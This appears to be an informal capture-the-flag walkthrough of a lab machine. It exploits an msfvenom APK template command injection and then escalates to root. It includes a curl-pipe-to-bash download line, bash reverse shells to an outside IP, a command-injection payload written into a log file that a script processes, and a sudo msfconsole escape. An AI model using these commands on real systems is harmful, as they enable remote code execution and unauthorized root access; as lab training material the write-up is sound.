1, enumerate ports and web-contents
22/tcp ssh
5000/tcp http `Werkzeug httpd 0.16.1 (Python 3.8.5)`

To be honest, I think this version of Werkzeug must have some exploits
`Werkzeug - 'Debug Shell' Command Execution`
`https://github.com/its-arun/Werkzeug-Debug-RCE.git

From the index page, we can know this is a nmap and metasploit usage website.

So let's check the command injections:
Given that all three of these seem to be running binaries from a Linux system, I’ll try command injection in each input, but without luck. Any non-alphanumeric characters in the searchsploit box lead to this warning
`stop hacking me - well hack you back`

Thus we can try to get some vulners of nmap or Metasploits
By checking the Exploit-db, there is nothing high-risk vulners for nmap, but there is something interesting for MSF
`Metasploit Framework 6.0.11 - msfvenom APK template command injection`
So cool, the best rce vulner.

So let's exploit it !

We can use the msf to help us to generate the payload and we just need to upload it .

In this place, I must say I want to fuck 0xdf, I really want to say why I cannot handle my shell !!!!!!!!!

So in this place, I would use another way 
`searchsploit -m multiple/local/49491.py`
Then change the scirpt :
```
# Change me
payload = 'curl 10.10.14.65/shell.sh|bash'

# make the shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.65/1337 0>&1
```

Then finally we get the user shell !!!!!!!

3, root shell
There is another user pwn and there is a interesting script for us.
```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

Reviewing the script, it is setting the log variable to /home/kid/logs/hackers. Next, it is changing the directory to the /home/pwn directory. After changing the directory, it uses cat to read the log file. Next, it uses space as a delimiter on the third field. It then passes the results to a while loop as an IP address and uses nmap to scan the IP.
```

Now that I understood what the script was doing, I should be able to craft a payload that gets executed. By echoing a payload to the /home/kid/logs/hackers file, the payload should get executed. However, I need to ensure that the payload is within the third field of the log. I started a netcat listener on port 1338 and then used echo to add the following payload to the log file.

`kid@scriptkiddie:~$ echo 'a b $(bash -c "bash -i &>/dev/tcp/10.10.14.65/443 0>&1")' > /home/kid/logs/hackers`

Then we get the pwn shell and we can check the `sudo -l`
```
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

With that in mind, I launched Metasploit with sudo and then dropped into the ruby shell as root which allowed me to capture the root flag.

```
sudo /opt/metasploit-framework-6.0.9/msfconsole
irb
system("/bin/bash")

Then we can run /bin/bash as root
```